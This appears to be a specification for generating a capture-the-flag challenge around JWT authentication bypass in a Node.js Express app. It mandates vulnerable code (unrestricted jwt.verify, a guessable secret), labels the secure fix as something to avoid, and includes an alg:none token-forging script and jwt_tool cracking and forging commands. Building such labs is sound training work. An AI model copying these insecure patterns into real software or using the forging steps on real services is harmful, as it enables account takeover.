# JWT Authentication Bypass

## Vulnerability Type
`jwt_auth` — CWE-347 — OWASP A02:2021 Cryptographic Failures

## Architecture
- **Backend**: Node.js Express (with `jsonwebtoken`)
- **Database**: SQLite or in-memory user store
- **Container**: Single container

## Vulnerable Code Pattern (MUST USE)

### Algorithm Confusion (None Algorithm)
```javascript
const jwt = require('jsonwebtoken');
const SECRET = 'your-secret-key-2024';

// Login endpoint — issues JWTs
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const user = db.prepare("SELECT * FROM users WHERE username = ? AND password = ?").get(username, password);
    if (!user) return res.status(401).json({ error: "Invalid credentials" });
    const token = jwt.sign({ id: user.id, username: user.username, role: user.role }, SECRET, { expiresIn: '1h' });
    return res.json({ token });
});

// VULNERABLE: jwt_auth — jwt.verify with algorithms not restricted
app.get('/admin', (req, res) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: "No token" });
    try {
        // VULNERABLE: does not specify allowed algorithms — accepts "none"
        const decoded = jwt.verify(token, SECRET);
        if (decoded.role !== 'admin') return res.status(403).json({ error: "Not admin" });
        return res.json({ message: "Welcome admin!", flag: process.env.FLAG });
    } catch (e) {
        return res.status(401).json({ error: "Invalid token" });
    }
});
```

### Weak Secret (Brute-Forceable)
```javascript
// VULNERABLE: jwt_auth — weak/guessable JWT secret
const SECRET = 'secret';  // Common wordlist entry, crackable with jwt_tool/hashcat
```

## Secure Code Pattern (MUST AVOID)
```javascript
// SAFE — explicitly restrict algorithms (DO NOT USE)
const decoded = jwt.verify(token, SECRET, { algorithms: ['HS256'] });
// SAFE — strong random secret (DO NOT USE)
const SECRET = require('crypto').randomBytes(64).toString('hex');
```

## Database Schema
```sql
CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT);
INSERT INTO users VALUES (1, 'admin', 'SuperSecretAdmin!2024', 'admin');
INSERT INTO users VALUES (2, 'user', 'password123', 'user');
```

## Flag Delivery
- Flag returned on `/admin` endpoint when JWT has `role: admin`
- Flag set via environment variable `FLAG` or hardcoded
- Player must forge a JWT with `role: admin`

## Exploit Payload

### Algorithm None Attack
```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"id": 1, "username": "admin", "role": "admin"}).encode()).rstrip(b'=')
token = f"{header.decode()}.{payload.decode()}."
# Use as: Authorization: Bearer <token>
```

### Weak Secret Attack
```bash
# Crack with hashcat or jwt_tool
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
# Then forge with the cracked secret
jwt_tool <token> -T -S hs256 -p "secret" -pc role -pv admin
```

## Docker Setup
```yaml
services:
  app:
    build: .
    ports:
      - "3000:3000"
    environment:
      - FLAG=FLAG_PLACEHOLDER
```

## Validation Criteria
- JWT library (`jsonwebtoken` for Node) MUST be used
- `jwt.verify()` MUST NOT specify `algorithms` option (allows `none` attack)
- OR secret MUST be a common dictionary word (crackable)
- `/admin` endpoint returns flag only when JWT contains `role: admin`
- Regular user login returns a valid JWT with `role: user`
- Forged JWT with `role: admin` MUST grant access to the flag
